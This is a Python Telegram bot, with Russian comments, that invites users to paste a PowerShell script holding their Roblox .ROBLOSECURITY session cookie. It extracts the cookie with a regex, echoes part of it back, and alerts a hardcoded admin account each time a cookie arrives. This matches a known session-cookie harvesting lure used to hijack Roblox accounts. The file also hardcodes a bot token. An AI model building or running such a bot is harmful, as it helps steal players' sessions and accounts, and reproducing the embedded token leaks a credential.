import re
import logging
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# Ваши данные
BOT_TOKEN = "8568068830:AAEbkbDf7LRZ0uf-YPTpfCi__5s5RIQm1Tg"
ADMIN_ID = 7666185377

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

def extract_cookie(text: str):
    """Извлекает куки из PowerShell скрипта"""
    pattern = r'\.ROBLOSECURITY["\']?\s*,\s*["\']([^"\']+)["\']'
    match = re.search(pattern, text)
    return match.group(1) if match else None

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🤖 *Бот для извлечения Roblox куки*\n\n"
        "Отправьте мне PowerShell скрипт с .ROBLOSECURITY куки.",
        parse_mode='Markdown'
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    text = update.message.text
    
    cookie = extract_cookie(text)
    
    if cookie:
        await update.message.reply_text(
            f"✅ *Cookie найден!*\n\n"
            f"👤 Ваш ID: `{user.id}`\n"
            f"📏 Длина: {len(cookie)} символов\n"
            f"🔐 Первые 50 символов:\n`{cookie[:50]}...`",
            parse_mode='Markdown'
        )
        
        # Уведомление админу
        if user.id != ADMIN_ID:
            try:
                await context.bot.send_message(
                    chat_id=ADMIN_ID,
                    text=f"📥 Новый куки от @{user.username or user.id}\nID: {user.id}"
                )
            except:
                pass
    else:
        await update.message.reply_text(
            "❌ Не удалось найти .ROBLOSECURITY куки в тексте.\n"
            "Убедитесь, что отправляете полный PowerShell скрипт.",
            parse_mode='Markdown'
        )

async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Доступ запрещен.")
        return
    
    await update.message.reply_text("📊 Статистика бота...")

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stats", stats))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    print("🤖 Бот запускается...")
    app.run_polling(drop_pending_updates=True)

if __name__ == '__main__':
    main()
